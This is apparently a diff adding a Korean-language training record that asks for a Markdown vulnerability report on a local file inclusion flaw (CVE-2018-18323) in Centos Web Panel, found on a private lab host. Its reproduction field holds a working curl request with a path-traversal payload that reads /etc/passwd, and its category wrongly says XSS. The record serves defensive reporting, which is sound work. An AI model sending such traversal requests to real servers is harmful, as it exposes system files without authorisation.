@@ -1,0 +1,5 @@
+{
+  "id": "192.168.64.2_20260102_113645_001",
+  "instruction": "다음 입력으로 Markdown 취약점 블록을 생성하라.\n규칙: Markdown만, 헤딩은 ##만, 이모지/표 금지, 한 줄 불릿.\n출력은 한국어로 작성.\n모든 항목(End-Point/영향/설명/근거/대응/조치)을 반드시 출력.\n근거는 증거/재현에서만 요약, 부족 시 '-' 사용.\n",
+  "input": "입력:\n제목: Centos Web Panel 0.9.8.480 - Local File Inclusion\n심각도: HIGH\n카테고리: XSS\n엔드포인트: http://192.168.64.2:9991/www/FileInclusion/pages/lvl2.php/admin/index.php, http://192.168.64.2:9991/www/FileInclusion/pages/lvl1.php/admin/index.php\nCVE: cve-2018-18323\n설명: Centos Web Panel version 0.9.8.480 suffers from local file inclusion vulnerabilities. Other vulnerabilities including cross-site scripting and remote code execution are also known to impact this version.\n영향: Successful exploitation of this vulnerability allows an attacker to read sensitive files on the server.\n증거: \n재현: curl -X 'GET' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Mozilla/5.0 (Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36' 'http://192.168.64.2:9991/www/FileInclusion/pages/lvl2.php/admin/index.php?module=file_editor&file=/../../../../../../../../../../../etc/passwd'\n대응/조치 힌트:"
+}
